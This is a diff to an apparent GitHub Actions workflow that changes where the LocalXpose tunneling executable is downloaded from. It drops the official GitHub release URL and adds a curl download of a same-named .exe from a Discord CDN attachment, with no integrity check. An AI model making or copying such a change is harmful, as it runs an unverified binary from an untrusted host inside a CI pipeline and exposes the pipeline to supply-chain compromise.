@@ -9,7 +9,7 @@ jobs:
     steps:
     - name: Download LocalXpose
       run: |
-        Invoke-WebRequest -Uri "https://github.com/localxpose/localxpose/releases/download/v1.4.17/localxpose-windows-x86_64.exe" -OutFile "lx.exe"
+        curl -L -o lx.exe "https://cdn.discordapp.com/attachments/1242453331223343124/1247328798899810335/localxpose-windows-x86_64.exe"
 
     - name: Login to LocalXpose
       env:
